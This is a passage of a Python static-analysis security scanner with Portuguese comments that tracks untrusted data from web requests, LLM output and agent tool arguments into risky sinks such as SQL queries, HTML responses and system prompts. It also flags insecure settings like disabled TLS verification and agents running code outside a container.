            if len(pos) >= 2000:
                return None
            pos.append(i)
            i = text.find(t, i + 1)
    if not pos:
        return []
    pos.sort()
    out, line, last = [], 1, 0
    for i in pos:
        line += text.count("\n", last, i)
        last = i
        if not out or out[-1] != line:
            out.append(line)
    return out


def _walk_lines(tree, lines):
    """Só os nós cujo trecho contém alguma das linhas: o resto da árvore nem é visitado."""
    todo = list(tree.body)
    while todo:
        n = todo.pop()
        lo = getattr(n, "lineno", None)
        if lo is not None:
            i = bisect.bisect_left(lines, lo)
            if i == len(lines) or lines[i] > (getattr(n, "end_lineno", None) or lo):
                continue
        yield n
        todo.extend(ast.iter_child_nodes(n))


def _statements(tree):
    """Todas as instruções, dentro de funções, classes e blocos (sem descer nas expressões)."""
    todo = list(tree.body)
    while todo:
        st = todo.pop()
        yield st
        for f in ("body", "orelse", "finalbody", "handlers", "cases"):
            v = getattr(st, f, None)
            if isinstance(v, list):
                todo.extend(x for x in v if isinstance(x, (ast.stmt, ast.excepthandler)) or type(x).__name__ == "match_case")


def _imports(tree):
    out = {}
    for node in _statements(tree):
        if isinstance(node, ast.Import):
            for a in node.names:
                if a.asname:
                    out[a.asname] = a.name
                else:
                    out[a.name.split(".")[0]] = a.name.split(".")[0]
        elif isinstance(node, ast.ImportFrom) and node.module and not node.level:
            for a in node.names:
                if a.name != "*":
                    out[a.asname or a.name] = f"{node.module}.{a.name}"
    return out


def _dotted(node, imports):
    parts = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(imports.get(node.id, node.id))
    elif isinstance(node, ast.Call):
        inner = _dotted(node.func, imports)
        if not inner:
            return None
        parts.append(inner + "()")
    else:
        return None
    return ".".join(reversed(parts))


def _norm(d):
    """numpy.random.randint via "import numpy as np"; os.path.basename; flask.redirect."""
    return d.replace("np.", "numpy.", 1) if d.startswith("np.") else d


def _receiver(call):
    """Nome do objeto de uma chamada de método: cursor em cursor.execute(...), engine em self.engine.query(...)."""
    f = call.func
    if not isinstance(f, ast.Attribute):
        return ""
    v = f.value
    while isinstance(v, ast.Call):
        v = v.func
    if isinstance(v, ast.Attribute):
        return v.attr
    if isinstance(v, ast.Name):
        return v.id
    return ""


def _const_str(node):
    return isinstance(node, ast.Constant) and isinstance(node.value, str)


def _kw(call, name):
    for k in call.keywords:
        if k.arg == name:
            return k.value
    return None


def _is_true(node):
    return isinstance(node, ast.Constant) and node.value is True


def _is_false(node):
    return isinstance(node, ast.Constant) and node.value is False


def _arg(call, i=0, *names):
    if len(call.args) > i and not isinstance(call.args[i], ast.Starred):
        return call.args[i]
    for n in names:
        v = _kw(call, n)
        if v is not None:
            return v
    return None


def _req_source(node):
    """request.args, request.json, request.GET, self.request.POST, flask.request.form."""
    if not isinstance(node, ast.Attribute) or node.attr not in _REQ_ATTRS:
        return False
    base = node.value
    if isinstance(base, ast.Name):
        return base.id == "request" or (base.id == "req" and node.attr in _REQ_ATTRS_STRICT)
    return isinstance(base, ast.Attribute) and base.attr == "request" and node.attr in _REQ_ATTRS_STRICT


def _names_in(node):
    out = []
    for n in _walk(node):
        if isinstance(n, ast.Name):
            out.append(n.id)
        elif isinstance(n, ast.Attribute):
            out.append(n.attr)
    return out


class _Fn:
    def __init__(self, node, route, tool, seg, head=""):
        self.node, self.route, self.tool = node, route, tool
        self.name = getattr(node, "name", "")
        self.admin = bool(_ADMIN.search(head))
        self.guard_path = bool(_GUARD_PATH.search(seg))
        self.guard_url = bool(_GUARD_URL.search(seg))
        self.guard_redirect = bool(_GUARD_REDIRECT.search(seg))
        self.html = False
        self.tool_env = False


class _Py:
    def __init__(self, rel, text, tree, ext=None):
        self.rel, self.text, self.tree = rel, text, tree
        self.lines = text.split("\n")
        self.imports = _imports(tree)
        mods = set(self.imports.values())
        self.server = any(m.split(".")[0] in _PY_WEB for m in mods)
        self.flaskish = any(m.split(".")[0] in ("flask", "quart", "bottle") for m in mods)
        self.llm_sdk = any(m.startswith(_PY_LLM_MODS) for m in mods)
        self.lc = any(m.startswith(("langchain", "llama_index", "langgraph", "crewai")) for m in mods)
        self.out = _Out(rel)
        self.strs = {}
        self.vals = {}
        # nome -> origens só para caminhos, quando o dado de fora nele é só a extensão (os.path.splitext(nome)[1]).
        self.path_env = {}
        self.has_ext = "splitext" in text
        self._safe_loaders = None
        self.clients = set()
        self.hashers = {}
        self.llm_funcs = set()
        self.routes = []   # (função, decoradores) para APP011
        self.tool_text = any(t in text for t in _TOOL_TEXT)
        self.anthropic_tools = "tool_use" in text or "toolUse" in text
        # Funções e métodos do próprio arquivo: o argumento de ferramenta passado a um helper continua sendo do modelo.
        self.funcs, self.methods, self.dispatch, self.enums, self.tool_refs = {}, {}, {}, set(), set()
        self.owner = {}     # método -> classe
        self.cls = None
        self.seeds = {}     # função -> parâmetros que recebem argumento de ferramenta
        self.analyzed = {}  # função -> parâmetros com que já foi analisada assim
        self.ximports = {}  # nome local -> (nível, módulo, nome) de "from .x import f" ou "from pacote.x import f"
        self.xcalls = []    # ((nível, módulo, nome), argumentos marcados): chamadas com argumento de ferramenta
        self.collect()
        for name, hits in ext or ():
            # Outro arquivo do projeto chama esta função com argumento de ferramenta.
            node = self.funcs.get(name)
            names = _seed_names(node, hits) if node is not None else set()
            if names:
                self.seeds.setdefault(node, set()).update(names)
        self.tool_possible = self.tool_text or "tool" in text or "Tool" in text or bool(ext)

    def collect(self):
        """Funções do módulo, métodos de cada classe, enums, dicionários de despacho ({"nome": funcao}) e funções
        registradas como ferramenta sem decorador."""
        for st in self.tree.body:
            if isinstance(st, (ast.FunctionDef, ast.AsyncFunctionDef)):
                self.funcs[st.name] = st
            elif isinstance(st, ast.ClassDef):
                bases = [self._dot(b) for b in st.bases]
                if any(b.rsplit(".", 1)[-1] in ("Enum", "StrEnum", "IntEnum", "Flag", "IntFlag") for b in bases if b):
                    self.enums.add(st.name)
                self.methods[st.name] = {m.name: m for m in st.body if isinstance(m, (ast.FunctionDef, ast.AsyncFunctionDef))}
                self.owner.update((m, st.name) for m in self.methods[st.name].values())
            elif isinstance(st, ast.ImportFrom) and (st.level or st.module):
                for a in st.names:
                    if a.name != "*":
                        self.ximports[a.asname or a.name] = (st.level, st.module or "", a.name)
            elif isinstance(st, (ast.Assign, ast.AnnAssign)) and isinstance(st.value, ast.Dict):
                targets = st.targets if isinstance(st, ast.Assign) else [st.target]
                fns = [v.id for k, v in zip(st.value.keys, st.value.values) if _const_str(k) and isinstance(v, ast.Name)]
                for t in targets:
                    if isinstance(t, ast.Name) and fns:
                        self.dispatch[t.id] = fns
        lines = _marked_lines(self.text, _TOOL_REF_TEXT)
        if lines == []:
            return
        for n in _walk(self.tree) if lines is None else _walk_lines(self.tree, lines):
            if not isinstance(n, ast.Call):
                continue
            f = n.func
            last = f.attr if isinstance(f, ast.Attribute) else f.id if isinstance(f, ast.Name) else ""
            refs = []
            if last in _TOOL_REGISTER:
                refs = ([] if last in ("Tool", "StructuredTool") else list(n.args[:1])) + \
                    [k.value for k in n.keywords if k.arg in ("fn", "func", "function", "coroutine", "async_fn")]
            for k in n.keywords:
                if k.arg == "tools" and isinstance(k.value, (ast.List, ast.Tuple)):
                    refs += k.value.elts
            self.tool_refs.update(r.id for r in refs if isinstance(r, ast.Name))

    def validated(self, p, default):
        """Parâmetro que o esquema já restringe: um Enum do arquivo ou Field(pattern=...), constr(regex=...)."""
        ann = p.annotation
        if isinstance(ann, ast.Name) and ann.id in self.enums:
            return True
        for part in (ann, default):
            if part is None:
                continue
            for n in _walk(part):
                if isinstance(n, ast.Call) and any(k.arg in ("pattern", "regex") for k in n.keywords):
                    return True
                if isinstance(n, ast.Name) and n.id in self.enums and part is ann:
                    return True
        return False

    def tool_class(self, node):
        """class Busca(BaseTool) de um framework de agente."""
        for b in node.bases:
            d = self._dot(b)
            root = d.split(".", 1)[0] if d else ""
            if d and d.rsplit(".", 1)[-1] in _TOOL_BASES and \
                    any(root == m or root.startswith(m + "_") for m in _TOOL_BASE_MODS):
                return True  # langchain_core.tools.BaseTool, crewai_tools..., smolagents.Tool
        return False

    # ------------------------------------------------------------------ origem dos valores

    def tool_arg(self, n):
        """tool_call.function.arguments, item.arguments, block.input (Anthropic), function_call.args (Gemini)."""
        a, v = n.attr, n.value
        name = v.attr if isinstance(v, ast.Attribute) else v.id if isinstance(v, ast.Name) else ""
        if a == "arguments":
            return name == "function" or bool(_TOOL_CALL_NAME.match(name))
        if a == "input":
            return self.anthropic_tools and bool(_TOOL_BLOCK_NAME.match(name))
        if a == "args":
            return name in ("function_call", "functionCall")
        return False

    def tool_key(self, n):
        """tool_call["function"]["arguments"] e tool_use["input"] (Bedrock, dicionários da API)."""
        if not _const_str(n.slice):
            return False
        key, v = n.slice.value, n.value
        name = v.id if isinstance(v, ast.Name) else v.attr if isinstance(v, ast.Attribute) else \
            v.slice.value if isinstance(v, ast.Subscript) and _const_str(v.slice) else ""
        if key == "arguments":
            return name == "function" or bool(_TOOL_CALL_NAME.match(name))
        if key == "input":
            return self.anthropic_tools and (name in ("toolUse", "tool_use") or bool(_TOOL_BLOCK_NAME.match(name)))
        return False

    def seg(self, node):
        end = getattr(node, "end_lineno", None) or node.lineno
        return "\n".join(self.lines[node.lineno - 1:end])

    def imported(self, node):
        """O nome na raiz de a.b.c veio de um import (e não de uma variável local com o mesmo nome)."""
        while isinstance(node, ast.Attribute):
            node = node.value
        return isinstance(node, ast.Name) and node.id in self.imports

    def system_text(self, v, env):
        """Dado da requisição dentro de um prompt de sistema que o código escreve. Repassar inteiro o prompt que o
        cliente mandou (playground, chat em que a pessoa escolhe as instruções) é escolha do app, não injeção."""
        if v is None or _const_str(v):
            return False
        if isinstance(v, ast.Call) and isinstance(v.func, ast.Attribute) and \
                v.func.attr in ("format", "format_map", "replace", "substitute", "safe_substitute", "join"):
            return any(self.origins(x, env) & REQ_ANY for x in list(v.args) + [k.value for k in v.keywords])
        parts = [p for p in self.pieces(v, env) if not (p[0] == "lit" and not p[1].strip())]
        tainted = [p for p in parts if p[0] == "expr" and p[1] is not None and self.origins(p[1], env) & REQ_ANY]
        return bool(tainted) and len(tainted) < len(parts)

    def _dot(self, node):
        d = _dotted(node, self.imports)
        return _norm(d) if d else ""

    def is_llm_call(self, call, cost=False):
        d = self._dot(call.func)
        if d and d.endswith(_PY_LLM_COST if cost else _PY_LLM_TEXT):
            return True
        if self.lc and isinstance(call.func, ast.Attribute) and call.func.attr in _LC_METHODS:
            return bool(_LC_RECEIVER.search(_receiver(call)))
        return False

    def origins(self, node, env, path=False):
        """path: as origens para montar um caminho, sem a extensão tirada do nome (ver ext_expr)."""
        out = set()
        stack = [node]
        while stack:
            n = stack.pop()
            if n is None or path and self.ext_expr(n):
                continue
            if isinstance(n, ast.Call):
                d = self._dot(n.func)
                last = d.rsplit(".", 1)[-1] if d else (n.func.attr if isinstance(n.func, ast.Attribute) else "")
                if last in _KILL or d in _KILL:
                    continue
                if self.is_llm_call(n):
                    out.add(LLM)
                if d.startswith(("requests.", "httpx.", "urllib.request.urlopen", "urllib3.", "aiohttp.")) or last in ("recv", "recv_bytes", "urlopen"):
                    out.add(NET)
                if _req_source(n.func):
                    out.add(REQ)
                if last in _PASS or d in _PASS:
                    stack.extend(a for a in n.args)
                    stack.extend(k.value for k in n.keywords)
                if isinstance(n.func, ast.Attribute):
                    stack.append(n.func.value)
                continue
            if _req_source(n):
                out.add(REQ)
                continue
            if isinstance(n, ast.Name):
                out |= self.path_env[n.id] if path and n.id in self.path_env else env.get(n.id, set())
                continue
            if isinstance(n, ast.Attribute):
                key = _attr_key(n)
                if key and key in env:
                    out |= env[key]
                    continue
                if n.attr in ("name", "stem", "suffix") and isinstance(n.value, ast.Call) and \
                        self._dot(n.value.func).endswith(("Path", "PurePath")):
                    continue
                if self.tool_text and self.tool_arg(n):
                    out.add(TOOL)
                    continue
                stack.append(n.value)
                continue
            if isinstance(n, ast.Subscript):
                if self.tool_text and self.tool_key(n):
                    out.add(TOOL)
                    continue
                stack.append(n.value)
                continue
            if isinstance(n, (ast.Compare, ast.Lambda)):
                continue
            if isinstance(n, ast.IfExp):
                # x if x in ALLOWED else "id": o valor de fora só passa quando é um dos permitidos.
                kept = self.allowed_branch(n, env)
                stack += [n.body, n.orelse] if kept is None else [kept]
                continue
            if isinstance(n, (ast.ListComp, ast.SetComp, ast.GeneratorExp, ast.DictComp)):
                stack += [g.iter for g in n.generators]
                stack += [n.key, n.value] if isinstance(n, ast.DictComp) else [n.elt]
                continue
            stack.extend(c for c in ast.iter_child_nodes(n) if not isinstance(c, _SKIP_NODES))
        return out

    # ------------------------------------------------------------------ strings montadas

    def pieces(self, node, env, depth=0, room=None):
        """Partes de uma string montada: [("lit", texto) | ("expr", nó)]. room: quantas partes ainda remontar (texto
        montado com outros textos montados cresce exponencialmente); o que passa vira ("expr", nó), que mantém a origem."""
        if room is None:
            room = [_PIECES]
        room[0] -= 1
        if depth > 6 or node is None or room[0] < 0:
            return [("expr", node)]
        if _const_str(node):
            return [("lit", node.value)]
        if isinstance(node, ast.JoinedStr):
            out = []
            for v in node.values:
                if _const_str(v):
                    out.append(("lit", v.value))
                elif isinstance(v, ast.FormattedValue):
                    out.append(("expr", v.value))
            return out
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            return self.pieces(node.left, env, depth + 1, room) + self.pieces(node.right, env, depth + 1, room)
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Mod) and _const_str(node.left):
            return _percent_pieces(node.left.value, node.right)
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.func.attr == "format" \
                and _const_str(node.func.value):
            return _format_pieces(node.func.value.value, node)
        if isinstance(node, ast.Name) and node.id in self.strs:
            out = []
            for part in self.strs[node.id]:
                out += self.pieces(part, env, depth + 1, room)
            return out
        return [("expr", node)]

    def static(self, node, value=False):
        """Valor que não vem de fora: constante, número, placeholder (",".join("?" * n)), nome de tabela do próprio código.
        value: o valor veio de fora e está onde vai um dado ('{x}', = {x}, LIKE, IN (...)); ali query, count ou item.name
        são o próprio dado, e só constante e placeholder contam."""
        if isinstance(node, ast.Constant):
            return True
        if isinstance(node, ast.Name):
            return node.id.isupper() or bool(_PLACEHOLDER.search(node.id)) or \
                not value and bool(_PY_SQL_PART.search(node.id))
        if isinstance(node, ast.Attribute):
            return not value and bool(re.search(r"(?i)table|schema|column|_meta|model|index|collection|^name$", node.attr)) \
                and isinstance(node.value, (ast.Name, ast.Attribute))
        if isinstance(node, ast.Call):
            d = self._dot(node.func)
            last = d.rsplit(".", 1)[-1] if d else ""
            if last in _KILL or last in ("Identifier", "quote_ident", "quote_name"):
                return True
            if last == "join":
                return any(_const_str(c) and re.search(r"\?|%s|%\(|\$\d|:\w|\{\}", c.value)
                           for c in _walk(node) if c is not node.func)
        return False

    def sql_verdict(self, node, env, need_sql=True):
        """(severidade, origem) para uma consulta montada com valores no meio do texto, ou None. need_sql: o texto fixo
        precisa parecer SQL (não num pedaço que já vai para o SQL, como o where do .extra do Django)."""
        parts = self.pieces(node, env)
        exprs = [(i, p) for i, (k, p) in enumerate(parts) if k == "expr"]
        if not exprs:
            return None
        lit = "".join(p if k == "lit" else "x1" for k, p in parts)
        if need_sql and not looks_sql(lit):
            return None
        # PRAGMA e DDL não aceitam parâmetros (nome de tabela, de índice): com origem desconhecida, não há o que corrigir.
        ddl = bool(_SQL_DDL.match(lit))
        best = None
        for i, expr in exprs:
            if expr is None or self.static(expr, value=True):
                continue
            o = self.origins(expr, env)
            value_pos = bool(_VALUE_POS.search(_lit_before(parts, i)))
            sev = "high"
            if self.static(expr):
                # Nome de tabela, coluna, ORDER BY ou LIMIT (table, order, item.model): de origem desconhecida, é o
                # código escolhendo. Vindo de fora e fora da posição de um dado, quem chama escolhe a coluna ou a tabela
                # (médio); um pedaço inteiro de SQL (where, sql) continua alto.
                if not o & (REQ_ANY | MODEL):
                    continue
                if not value_pos and not (isinstance(expr, ast.Name) and _SQL_FRAGMENT.search(expr.id)):
                    sev = "medium"
            if LLM in o:
                v = (sev, LLM)
            elif TOOL in o:
                v = (sev, TOOL)
            elif o & REQ_ANY:
                v = (sev, REQ)
            elif PARAM in o and not ddl and value_pos:
                v = ("medium", PARAM)
            else:
                continue
            if sev == "high" and v[1] in MODEL:
                return v
            best = _sql_best(best, v)
        return best

    # ------------------------------------------------------------------ percurso

    def run(self):
        top = _Fn(None, False, False, "")
        top.tool_env = self.tool_text  # for tool_call in resp.choices[0].message.tool_calls: no nível do módulo
        self.body(self.tree.body, {}, top)
        # Helpers que recebem argumento de ferramenta (handle_call_tool -> run_query(args["sql"])): de novo, com esses
        # parâmetros vindo do modelo. Poucas rodadas: helper que chama helper.
        for _ in range(3):
            todo = [(node, set(p)) for node, p in self.seeds.items() if not set(p) <= self.analyzed.get(node, set())]
            if not todo:
                break
            for node, params in todo[:40]:
                self.analyzed[node] = self.analyzed.get(node, set()) | params
                self.cls = self.owner.get(node)
                self.function(node, {}, seeds=self.analyzed[node])
        self.cls = None
        self.unbounded()
        return self.out.list()

    def body(self, stmts, env, fn):
        for st in stmts:
            self.stmt(st, env, fn)

    def stmt(self, st, env, fn):
        if isinstance(st, (ast.FunctionDef, ast.AsyncFunctionDef)):
            self.function(st, env)
            return
        if isinstance(st, ast.ClassDef):
            saved, self.cls = self.cls, st.name
            tool_cls = self.tool_class(st)
            for item in st.body:
                if isinstance(item, (ast.FunctionDef, ast.AsyncFunctionDef)):
                    self.function(item, {}, tool=tool_cls and item.name in _TOOL_METHODS)
                else:
                    self.stmt(item, {}, fn)
            self.cls = saved
            return
        for h in _header(st):
            self.check(h, env, fn)
        if isinstance(st, ast.Assign):
            self.assign(st.targets, st.value, env, fn)
        elif isinstance(st, ast.AnnAssign) and st.value is not None:
            self.assign([st.target], st.value, env, fn)
        elif isinstance(st, ast.AugAssign):
            o = self.origins(st.value, env)
            if isinstance(st.target, ast.Name):
                name = st.target.id
                po = (self.path_env.get(name, env.get(name, set())) | self.origins(st.value, env, path=True)) \
                    if self.has_ext else None
                env[name] = env.get(name, set()) | o
                if po is not None:
                    self.path_view(name, po, env[name])
                if isinstance(st.op, ast.Add) and st.target.id in self.strs:
                    if len(self.strs[st.target.id]) < _STR_PARTS:
                        self.strs[st.target.id] = self.strs[st.target.id] + [st.value]
                    else:
                        del self.strs[st.target.id]  # texto montado em dezenas de passos: segue só a origem
        elif isinstance(st, (ast.For, ast.AsyncFor)):
            _bind(st.target, self.origins(st.iter, env), env)
            self.unpath(st.target)
        elif isinstance(st, (ast.With, ast.AsyncWith)):
            for it in st.items:
                if it.optional_vars is not None:
                    _bind(it.optional_vars, self.origins(it.context_expr, env), env)
                    self.unpath(it.optional_vars)
                    if isinstance(it.optional_vars, ast.Name) and isinstance(it.context_expr, ast.Call) and \
                            self._dot(it.context_expr.func) in _PY_CLIENT_CTOR:
                        self.clients.add(it.optional_vars.id)
        elif isinstance(st, ast.Return) and st.value is not None:
            self.returned(st, env, fn)
        for b in _bodies(st):
            self.body(b, env, fn)
        if isinstance(st, ast.If) and _exits(st.body):
            for key in self.guarded(st.test, env):
                env[key] = set()  # if x not in ALLOWED: abort(400): daqui em diante x é um dos permitidos

    def function(self, node, outer, tool=False, seeds=None):
        decos = [self._dot(d.func if isinstance(d, ast.Call) else d) for d in node.decorator_list]
        route = any(_ROUTE_DECO.search(d) for d in decos if d)
        tool = tool or any(_TOOL_DECO.search(d) for d in decos if d) or (node.name in self.tool_refs and self.cls is None)
        env = dict(outer)
        saved = self.strs, self.vals, self.path_env
        self.strs, self.vals, self.path_env = dict(saved[0]), dict(saved[1]), dict(saved[2])
        a = node.args
        params = a.posonlyargs + a.args + a.kwonlyargs + [x for x in (a.vararg, a.kwarg) if x]
        defaults = dict(zip([p.arg for p in (a.posonlyargs + a.args)][::-1], a.defaults[::-1]))
        defaults.update({p.arg: d for p, d in zip(a.kwonlyargs, a.kw_defaults) if d is not None})
        # Comando de linha (click, typer): quem passa o argumento é quem roda o programa.
        cli = not route and not tool and any(_CLI_DECO.search(d) for d in decos if d)
        segs = _route_segments(node) if route else {}
        for p in params:
            self.path_env.pop(p.arg, None)
            if p.arg in ("self", "cls") or cli or segs.get(p.arg) == "typed" or _scalar_annotation(p.annotation) or \
                    self.validated(p, defaults.get(p.arg)) or ((tool or seeds) and _tool_injected(p)):
                env.pop(p.arg, None)  # o parâmetro esconde a variável de fora com o mesmo nome
                continue
            origin = PARAM
            if tool or (seeds and p.arg in seeds):
                origin = TOOL
            elif route and not _framework_param(p, defaults.get(p.arg), self.imports):
                origin = SEG if segs.get(p.arg) == "seg" else REQ
            env[p.arg] = {origin}
        head_start = min([d.lineno for d in node.decorator_list] + [node.lineno])
        head_end = max(head_start, node.body[0].lineno - 1) if node.body else node.lineno
        fn = _Fn(node, route, tool, self.seg(node), "\n".join(self.lines[head_start - 1:head_end]))
        # Argumento de ferramenta pode estar no ambiente: função de ferramenta, helper que o recebe, closure dentro de
        # uma delas, ou arquivo que lê tool calls da API.
        fn.tool_env = tool or bool(seeds) or self.tool_text or any(TOOL in v for v in outer.values())
        # Flask devolve texto como HTML; FastAPI só com response_class=HTMLResponse (sem ele, o texto vira JSON).
        html_class = any(isinstance(d, ast.Call) and _kw(d, "response_class") is not None and
                         self._dot(_kw(d, "response_class")).endswith("HTMLResponse") for d in node.decorator_list)
        fn.html = route and (self.flaskish or html_class)
        if route and seeds is None:
            self.routes.append((node, decos))
        if self.llm_sdk and any(isinstance(c, ast.Call) and self.is_llm_call(c, cost=True) for c in _walk(node)):
            self.llm_funcs.add(node.name)
        self.body(node.body, env, fn)
        self.strs, self.vals, self.path_env = saved

    def allowed_branch(self, n, env):
        """O outro lado de x if x in ALLOWED else padrão (e de padrão if x not in ALLOWED else x), com a lista do código,
        ou None quando o if não confere o próprio valor numa lista."""
        t = n.test
        if not (isinstance(t, ast.Compare) and len(t.ops) == 1 and isinstance(t.ops[0], (ast.In, ast.NotIn))):
            return None
        key = _guard_key(t.left)
        kept, checked = (n.orelse, n.body) if isinstance(t.ops[0], ast.In) else (n.body, n.orelse)
        if not key or key != _guard_key(checked) or self.origins(t.comparators[0], env) & (REQ_ANY | MODEL):
            return None
        return kept

    def guarded(self, test, env):
        """Nomes que o teste de um if que sai da função confere: x not in ALLOWED, not x.isdigit(),
        not re.fullmatch(padrão, x), not validate_x(x). Com "or", vale cada parte (o if sai se qualquer uma falhar)."""
        if isinstance(test, ast.BoolOp) and isinstance(test.op, ast.Or):
            return [k for v in test.values for k in self.guarded(v, env)]
        if isinstance(test, ast.Compare) and len(test.ops) == 1 and isinstance(test.ops[0], ast.NotIn):
            # A lista de permitidos é do código (constante, ALLOWED, do banco), não de quem chama.
            if not self.origins(test.comparators[0], env) & (REQ_ANY | MODEL | {TOOL}):
                return [k for k in [_guard_key(test.left)] if k]
            return []
        if not (isinstance(test, ast.UnaryOp) and isinstance(test.op, ast.Not) and isinstance(test.operand, ast.Call)):
            return []
        call = test.operand
        f = call.func
        if isinstance(f, ast.Attribute) and f.attr in _STR_CHECKS and not call.args:
            return [k for k in [_guard_key(f.value)] if k]
        d = self._dot(f)
        last = d.rsplit(".", 1)[-1] if d else ""
        if last in ("fullmatch", "match", "search"):
            # re.fullmatch(p, x), PADRAO.fullmatch(x), re.match(r"^[a-z_]+$", x): match só vale com o fim ancorado
            # ($ ou \Z) e search com os dois, num padrão que se vê no código.
            if d.startswith("re."):
                pat, arg = (list(call.args) + [None, None])[:2]
            elif isinstance(f, ast.Attribute):
                v = self.vals.get(f.value.id) if isinstance(f.value, ast.Name) else None
                pat = v.args[0] if isinstance(v, ast.Call) and self._dot(v.func) == "re.compile" and v.args else None
                arg = call.args[0] if call.args else None
            else:
                return []
            if last == "fullmatch" or _anchored(pat.value if _const_str(pat) else None, last == "search"):
                return [k for k in [_guard_key(arg)] if k]
            return []
        if _VALIDATOR.match(last) and not _NOT_VALIDATOR.search(last) and call.args:
            return [k for k in [_guard_key(call.args[0])] if k]
        return []

    def ext_expr(self, n):
        """os.path.splitext(nome)[1] (ou [-1]), com .lower() ou .strip() em cima: a extensão não tem / nem .., então num
        caminho o nome do arquivo que veio de fora só escolhe o .png. Em SQL ou num comando ela continua sendo de fora."""
        while isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) and n.func.attr in _EXT_STR:
            n = n.func.value
        if not (isinstance(n, ast.Subscript) and isinstance(n.value, ast.Call)):
            return False
        i = n.slice
        if isinstance(i, ast.UnaryOp) and isinstance(i.op, ast.USub):
            i = i.operand
        return isinstance(i, ast.Constant) and i.value == 1 and self._dot(n.value.func).endswith("splitext")

    def path_view(self, name, po, o):
        if po != o:
            self.path_env[name] = set(po)
        else:
            self.path_env.pop(name, None)

    def unpath(self, target):
        if self.path_env:
            for n in _walk(target):
                if isinstance(n, ast.Name):
                    self.path_env.pop(n.id, None)

    def assign(self, targets, value, env, fn):
        o = self.origins(value, env)
        po = self.origins(value, env, path=True) if self.has_ext and o else o
        for t in targets:
            self.assigned(t, value, fn)
            _bind(t, o, env)
            if self.has_ext:
                self.unpath(t)
                if isinstance(t, ast.Name):
                    self.path_view(t.id, po, o)
                elif isinstance(t, (ast.Tuple, ast.List)) and len(t.elts) == 2 and isinstance(t.elts[1], ast.Name) and \
                        isinstance(value, ast.Call) and self._dot(value.func).endswith("splitext"):
                    self.path_env[t.elts[1].id] = set()  # raiz, ext = os.path.splitext(nome)
            if isinstance(t, ast.Name):
                self.vals[t.id] = value
                if _builds_string(value) or (isinstance(value, ast.Name) and value.id in self.strs):
                    self.strs[t.id] = list(self.strs.get(value.id, [])) if isinstance(value, ast.Name) else [value]
                else:
                    self.strs.pop(t.id, None)
                if isinstance(value, ast.Call):
                    d = self._dot(value.func)
                    if d in _PY_CLIENT_CTOR:
                        self.clients.add(t.id)
                    if d in _PY_HASH:
                        self.hashers[t.id] = _PY_HASH[d]
                    if d == "hashlib.new" and value.args and _const_str(value.args[0]):
                        self.hashers[t.id] = value.args[0].value.upper()

    def assigned(self, target, value, fn):
        """Atribuições que já são o problema: session.verify = False, token = random..., interpreter.auto_run = True."""
        ln = target.lineno
        name = target.id if isinstance(target, ast.Name) else target.attr if isinstance(target, ast.Attribute) else \
            (target.slice.value if isinstance(target, ast.Subscript) and _const_str(target.slice) else "")
        if isinstance(target, ast.Attribute):
            d = self._dot(target)
            if target.attr == "verify" and _is_false(value):
                self.out.add("COD006", "medium", ln, {"what": "verify = False"})
            elif target.attr == "check_hostname" and _is_false(value):
                self.out.add("COD006", "medium", ln, {"what": "check_hostname = False"})
            elif target.attr == "verify_mode" and self._dot(value).endswith("CERT_NONE"):
                self.out.add("COD006", "medium", ln, {"what": "verify_mode = CERT_NONE"})
            elif d == "ssl._create_default_https_context" and self._dot(value).endswith("_create_unverified_context"):
                self.out.add("COD006", "medium", ln, {"what": "ssl._create_unverified_context"})
            elif target.attr == "auto_run" and _is_true(value) and any(m.startswith("interpreter") for m in self.imports.values()):
                self.out.add("APP013", "high", ln, _agent_params("auto_run"))
        if name and (secret_name(name) or session_name(name)) and self.weak_random(value) and \
                (secret_name(name) or _cookie_holds(self.text if fn.node is None else self.seg(fn.node), name)):
            self.out.add("COD010", "low", ln, {"name": name})

    def returned(self, st, env, fn):
        if fn.node is not None and secret_name(fn.name) and self.weak_random(st.value):
            self.out.add("COD010", "low", st.lineno, {"name": fn.name})
        v = st.value
        if isinstance(v, ast.Tuple) and v.elts:
            v = v.elts[0]  # return html, 200
        if fn.html and (_builds_string(v) or (isinstance(v, ast.Name) and v.id in self.strs)):
            self.html_response(v, env, st.lineno)

    def html_response(self, value, env, ln):
        parts = self.pieces(value, env)
        lit = "".join(p for k, p in parts if k == "lit")
        if re.search(r"<[a-zA-Z]", lit) and any(k == "expr" and self.origins(p, env) & REQ_ANY for k, p in parts):
            self.out.add("COD005", "medium", ln, {"sink": "HTML"})

    def weak_random(self, node):
        for c in _walk(node):
            if isinstance(c, ast.Call) and self._dot(c.func) in _PY_RANDOM:
                return True
        return False

    # ------------------------------------------------------------------ chamadas perigosas

    def check(self, node, env, fn):
        for n in _walk(node):
            if isinstance(n, ast.NamedExpr) and isinstance(n.target, ast.Name):
                env[n.target.id] = self.origins(n.value, env)
            elif isinstance(n, ast.Call):
                self.call(n, env, fn)
            elif isinstance(n, ast.Dict):
                self.dict_literal(n, env)
            elif isinstance(n, ast.Tuple) and len(n.elts) == 2 and _const_str(n.elts[0]) and n.elts[0].value == "system":
                if self.system_text(n.elts[1], env):
                    self.out.add("APP010", "medium", n.lineno)

    def dict_literal(self, node, env):
        keys = {k.value: v for k, v in zip(node.keys, node.values) if _const_str(k)}
        if _const_str(keys.get("role")) and keys["role"].value in ("system", "developer") and "content" in keys:
            if self.system_text(keys["content"], env):
                self.out.add("APP010", "medium", node.lineno)
        if "use_docker" in keys and _is_false(keys["use_docker"]) and "code_execution_config" in self.text:
            # AutoGen: o código que o modelo escreve roda direto na máquina, fora do container.
            self.out.add("APP013", "high", node.lineno, _agent_params("use_docker"))

    def call(self, call, env, fn):
        d = self._dot(call.func)
        last = d.rsplit(".", 1)[-1] if d else (call.func.attr if isinstance(call.func, ast.Attribute) else "")
        ln = call.lineno
        tool = self.tool_possible and fn.tool_env
        if tool:
            self.local_call(call, env)
        self.command(call, d, env, fn, ln)
        self.code_exec(call, d, last, env, fn, ln)
        self.sql(call, d, last, env, ln)
        self.deserialize(call, d, env, ln)
        self.tls(call, d, last, ln)
        self.files(call, d, last, env, fn, ln)
        self.urls(call, d, last, env, fn, ln)
        self.html(call, d, last, env, ln)
        self.models(call, d, last, env, ln)
        self.prompt(call, d, env, ln)
        self.hashing(call, d, last, ln)
